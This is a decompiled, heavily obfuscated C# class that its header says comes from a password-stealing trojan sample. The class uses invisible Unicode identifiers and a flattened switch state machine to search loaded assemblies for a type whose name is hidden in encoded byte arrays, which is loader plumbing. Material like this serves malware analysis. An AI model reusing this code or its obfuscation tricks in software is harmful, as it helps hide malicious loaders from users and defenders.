// Decompiled with JetBrains decompiler
// Type: ‮‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮
// Assembly: NEW ORDER22933, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FEEFEDDF-1A16-40C7-BF20-70CEE25E5EE2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.Win32.Generic-b95cc7fcff0db3482364284d26cfe8e1f9d9ca49116973fc864e44cf847ea8cf.exe

using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal class \u202E‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮
{
  public static Type \u200D⁭​⁫‫⁫​⁭‭‫⁭‫‪‭‪⁫‏‍‭‭⁭‎​‬​⁪‫⁬‍⁯‏‮⁯‏‪⁪‪‍‌‮‮()
  {
label_1:
    int num1 = 1157230060;
    int index1;
    Assembly[] assemblyArray;
    bool flag;
    Type type1;
    Type type2;
    Assembly assembly;
    Type[] typeArray;
    int index2;
    while (true)
    {
      uint num2;
      switch ((num2 = (uint) (num1 ^ 1653291007)) % 21U)
      {
        case 0:
          int num3 = !flag ? -842895626 : (num3 = -1759080240);
          num1 = num3 ^ (int) num2 * -751228040;
          continue;
        case 1:
          type1 = typeArray[index2];
          num1 = 757842372;
          continue;
        case 2:
          num1 = (int) num2 * 603104702 ^ 1484089264;
          continue;
        case 3:
          num1 = (int) num2 * -1577225065 ^ -645699614;
          continue;
        case 4:
          assemblyArray = \u202E‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮.\u202E‎‪⁯⁮‍⁪‎​⁫‪‎‮‪‫⁪‏⁮⁮‫⁭⁭​⁭‌‭‫⁮‫‌‫‫⁯⁪‫‍‌‎⁬⁪‮(\u202E‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮.\u202A⁪⁮⁫‫‬‫⁪⁯⁪‭‍‭​‎⁫‎‮⁯‎⁪⁯⁮⁭‌⁮‪‬⁪‪⁮‮‫⁫‫⁯⁯‫⁪⁪‮());
          num1 = (int) num2 * -217187443 ^ -1948581787;
          continue;
        case 5:
          int num4 = flag ? 646273830 : (num4 = 1082918816);
          num1 = num4 ^ (int) num2 * 1427110020;
          continue;
        case 6:
          ++index1;
          num1 = 348890589;
          continue;
        case 7:
          string str1 = \u202E‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮.\u202B‭‮‎⁫⁭‎⁮‎⁬​‫⁯⁪⁮⁭‏⁪‍​‮⁯‮⁯⁫⁪‭‭‭‌‮⁫​‬​⁪‏‪‫‍‮((MemberInfo) type1);
          byte[] numArray1 = new byte[11];
          // ISSUE: field reference
          \u202E‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮.\u202A⁭​‫⁪‍‭⁯‏‪⁬‫​‪​⁭‫‌‎‍⁫‭​⁫‍⁮‫‫⁬‮⁮⁭‫‬‍⁯⁪⁯‌⁪‮((Array) numArray1, __fieldref (\u206F‭​⁯‬‬⁮‏‭⁬​​‭‌‬‎⁫‏⁪⁭‎‪‎‪‬‫⁯⁮‌⁭⁫⁯‌‭‭‪⁪‬‭‮‮.\u0024\u0024method0x6000015\u002D2));
          string str2 = \u200F‍‌‭‫⁭‪‏​⁬‭⁪⁪‪‬‮⁮‎‫‎‍⁮‏⁭⁫⁫‌⁭‍‫⁯⁬​‫‌‬⁭‭‎‌‮.\u202D‪‬⁬‍⁫⁫⁬‪⁭‍⁫⁯‍‌‬⁭⁮‮‬​​‭⁫‪‮‌⁬⁭‌‮‫‎⁭​⁪‌⁬‮‪‮(numArray1);
          flag = !\u202E‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮.\u202A‪‎⁭‪‭⁬‫⁬‏‭‏‬⁫‍⁬⁭⁪‌‮‍​⁭‫⁫⁬‍⁫‏​‬⁬⁫‫⁮‭‍⁪‌⁭‮(str1, str2);
          int num5 = flag ? 1157252193 : (num5 = 2001933394);
          num1 = num5 ^ (int) num2 * 1222214109;
          continue;
        case 8:
          num1 = (int) num2 * -527797427 ^ 1254360915;
          continue;
        case 9:
          typeArray = \u202E‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮.\u200D‮⁯⁬‪‎‍‏⁮​⁫‏‌⁮‎‬‮‫‮‍‬‬‏‫‬⁭‫‎⁭‭‪‫‭​⁪‎‎⁬⁪‫‮(assembly);
          num1 = (int) num2 * 1899572931 ^ 227996011;
          continue;
        case 10:
          assembly = assemblyArray[index1];
          string str3 = \u202E‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮.\u206B⁫‪⁪⁪⁫⁮‫‭‏⁯‫⁮⁯⁮‏⁭⁪‌‏⁯‮​⁯‍‍⁬‍‬‮‮‏⁫‮⁭⁭‏⁬‬⁪‮(assembly);
          byte[] numArray2 = new byte[21];
          // ISSUE: field reference
          \u202E‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮.\u202A⁭​‫⁪‍‭⁯‏‪⁬‫​‪​⁭‫‌‎‍⁫‭​⁫‍⁮‫‫⁬‮⁮⁭‫‬‍⁯⁪⁯‌⁪‮((Array) numArray2, __fieldref (\u206F‭​⁯‬‬⁮‏‭⁬​​‭‌‬‎⁫‏⁪⁭‎‪‎‪‬‫⁯⁮‌⁭⁫⁯‌‭‭‪⁪‬‭‮‮.\u0024\u0024method0x6000015\u002D1));
          string str4 = \u200F‍‌‭‫⁭‪‏​⁬‭⁪⁪‪‬‮⁮‎‫‎‍⁮‏⁭⁫⁫‌⁭‍‫⁯⁬​‫‌‬⁭‭‎‌‮.\u202D‪‬⁬‍⁫⁫⁬‪⁭‍⁫⁯‍‌‬⁭⁮‮‬​​‭⁫‪‮‌⁬⁭‌‮‫‎⁭​⁪‌⁬‮‪‮(numArray2);
          flag = !\u202E‎​‪⁫‍‮‪‎‫⁮⁫⁭⁬⁯‌‫‫⁬‭⁮⁮‌‫⁬‭‪‮⁬⁮‭⁮⁯⁫⁮‮‏‭⁪‫‮.\u206E‎⁮⁭⁬⁫‪⁫⁪‍‌⁪‭‭⁪‏‏‮‬‍⁯​⁮‮⁪⁭​⁮⁫‍​⁫‫⁫‎⁭‮‬‫‏‮(str3, str4);
          num1 = 307285809;
          continue;
        case 11:
          index2 = 0;
          num1 = (int) num2 * -456854251 ^ 891456535;
          continue;
        case 12:
          ++index2;
          num1 = 886256434;
          continue;
        case 13:
          goto label_1;
        case 14:
          flag = index2 < typeArray.Length;
          num1 = 1527235244;
          continue;
        case 15:
          type2 = type1;
          goto case 16;
        case 16:
          num1 = 455459186;
          continue;
        case 17:
          flag = index1 < assemblyArray.Length;
          int num6;
          num1 = num6 = flag ? 1160342576 : (num6 = 756297320);
          continue;
        case 18:
          type2 = (Type) null;
          num1 = (int) num2 * 1417392857 ^ -1369168015;
          continue;
        case 20:
          index1 = 0;
          num1 = (int) num2 * 1381638774 ^ -497110193;
          continue;
        default:
          goto label_22;
      }
    }
label_22:
    return type2;
  }

  static AppDomain \u202A⁪⁮⁫‫‬‫⁪⁯⁪‭‍‭​‎⁫‎‮⁯‎⁪⁯⁮⁭‌⁮‪‬⁪‪⁮‮‫⁫‫⁯⁯‫⁪⁪‮() => AppDomain.CurrentDomain;

  static Assembly[] \u202E‎‪⁯⁮‍⁪‎​⁫‪‎‮‪‫⁪‏⁮⁮‫⁭⁭​⁭‌‭‫⁮‫‌‫‫⁯⁪‫‍‌‎⁬⁪‮([In] AppDomain obj0) => obj0.GetAssemblies();

  static string \u206B⁫‪⁪⁪⁫⁮‫‭‏⁯‫⁮⁯⁮‏⁭⁪‌‏⁯‮​⁯‍‍⁬‍‬‮‮‏⁫‮⁭⁭‏⁬‬⁪‮([In] Assembly obj0) => obj0.FullName;

  static void \u202A⁭​‫⁪‍‭⁯‏‪⁬‫​‪​⁭‫‌‎‍⁫‭​⁫‍⁮‫‫⁬‮⁮⁭‫‬‍⁯⁪⁯‌⁪‮([In] Array obj0, [In] RuntimeFieldHandle obj1) => RuntimeHelpers.InitializeArray(obj0, obj1);

  static bool \u206E‎⁮⁭⁬⁫‪⁫⁪‍‌⁪‭‭⁪‏‏‮‬‍⁯​⁮‮⁪⁭​⁮⁫‍​⁫‫⁫‎⁭‮‬‫‏‮([In] string obj0, [In] string obj1) => obj0.Contains(obj1);

  static Type[] \u200D‮⁯⁬‪‎‍‏⁮​⁫‏‌⁮‎‬‮‫‮‍‬‬‏‫‬⁭‫‎⁭‭‪‫‭​⁪‎‎⁬⁪‫‮([In] Assembly obj0) => obj0.GetTypes();

  static string \u202B‭‮‎⁫⁭‎⁮‎⁬​‫⁯⁪⁮⁭‏⁪‍​‮⁯‮⁯⁫⁪‭‭‭‌‮⁫​‬​⁪‏‪‫‍‮([In] MemberInfo obj0) => obj0.Name;

  static bool \u202A‪‎⁭‪‭⁬‫⁬‏‭‏‬⁫‍⁬⁭⁪‌‮‍​⁭‫⁫⁬‍⁫‏​‬⁬⁫‫⁮‭‍⁪‌⁭‮([In] string obj0, [In] string obj1) => obj0 == obj1;
}
